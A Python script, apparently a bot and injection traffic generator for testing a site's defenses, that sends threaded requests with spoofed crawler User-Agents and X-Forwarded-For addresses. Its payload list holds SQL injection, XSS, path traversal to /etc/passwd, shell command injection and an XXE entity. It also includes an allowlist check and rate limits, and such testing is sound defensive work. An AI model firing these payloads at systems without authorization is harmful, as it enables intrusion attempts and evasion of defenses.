#!/usr/bin/env python3
import argparse
import logging
import os
import random
import requests
import string
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote, urlencode

from common import COMMON_PAYLOADS, load_allowlist, validate_target

TARGET_URL = "https://yourtargetdomain.com"
THREADS = 10
REQUESTS_PER_THREAD = 100
DELAY_BETWEEN_REQUESTS = 0.5  # seconds
VERIFY_TLS = True

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "curl/7.68.0",
    "python-requests/2.27.1",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
]

PAYLOADS = COMMON_PAYLOADS + [
    "' OR 'a'='a' /*",
    quote("' OR '1'='1"),  # URL encoded SQLi
    "<svg/onload=alert`XSS`>",
    "%3Cscript%3Ealert('encoded')%3C/script%3E",  # Encoded XSS
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded path traversal
    "| ls -la /",
    "|| ping -c 1 127.0.0.1",
    "${7*7}",
    "<?xml version='1.0'?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
]

logger = logging.getLogger("bot_test")


def random_string(length=8):
    return "".join(random.choice(string.ascii_letters) for _ in range(length))


def build_url():
    path = "/" + random_string(random.randint(5, 15))
    params = {
        random_string(4): random.choice(PAYLOADS) if random.random() < 0.5 else random_string(6)
        for _ in range(random.randint(1, 4))
    }
    query = urlencode(params, doseq=True)
    return f"{TARGET_URL}{path}?{query}"


def send_request(session):
    url = build_url()
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
    }
    try:
        r = session.get(url, headers=headers, timeout=5, verify=VERIFY_TLS)
        line = f"[{r.status_code}] {url} ({headers['User-Agent']})"
    except requests.RequestException as e:
        line = f"[ERROR] {e}"
    logger.info(line)


def worker(stop_at):
    session = requests.Session()
    for _ in range(REQUESTS_PER_THREAD):
        if stop_at and time.time() >= stop_at:
            break
        send_request(session)
        time.sleep(DELAY_BETWEEN_REQUESTS)


def main():
    global TARGET_URL, THREADS, REQUESTS_PER_THREAD, DELAY_BETWEEN_REQUESTS, VERIFY_TLS

    parser = argparse.ArgumentParser(description="Bot & Injection traffic generator")
    parser.add_argument("--target", default=TARGET_URL)
    parser.add_argument("--threads", type=int, default=THREADS)
    parser.add_argument("--rpt", type=int, default=REQUESTS_PER_THREAD, help="Requests per thread")
    parser.add_argument("--delay", type=float, default=DELAY_BETWEEN_REQUESTS, help="Delay between requests")
    parser.add_argument("--logdir", default=None, help="Directory to write bot_test.log")
    parser.add_argument("--insecure-tls", action="store_true", help="Disable TLS verification")
    parser.add_argument("--max-seconds", type=int, default=0, help="Maximum runtime in seconds")
    parser.add_argument("--allowlist", help="Path to file containing allowed target hosts")
    args = parser.parse_args()

    TARGET_URL = args.target
    try:
        allowlist = load_allowlist(args.allowlist)
        validate_target(TARGET_URL, allowlist)
    except ValueError as exc:
        parser.error(str(exc))
    THREADS = args.threads
    REQUESTS_PER_THREAD = args.rpt
    DELAY_BETWEEN_REQUESTS = args.delay
    VERIFY_TLS = not args.insecure_tls
    stop_at = time.time() + args.max_seconds if args.max_seconds > 0 else None

    logger.setLevel(logging.INFO)
    logger.handlers.clear()
    handler = logging.StreamHandler()
    handler.setFormatter(logging.Formatter("%(message)s"))
    logger.addHandler(handler)
    if args.logdir:
        os.makedirs(args.logdir, exist_ok=True)
        fh = logging.FileHandler(os.path.join(args.logdir, "bot_test.log"), encoding="utf-8")
        fh.setFormatter(logging.Formatter("%(message)s"))
        logger.addHandler(fh)

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for _ in range(THREADS):
            executor.submit(worker, stop_at)


if __name__ == "__main__":
    main()
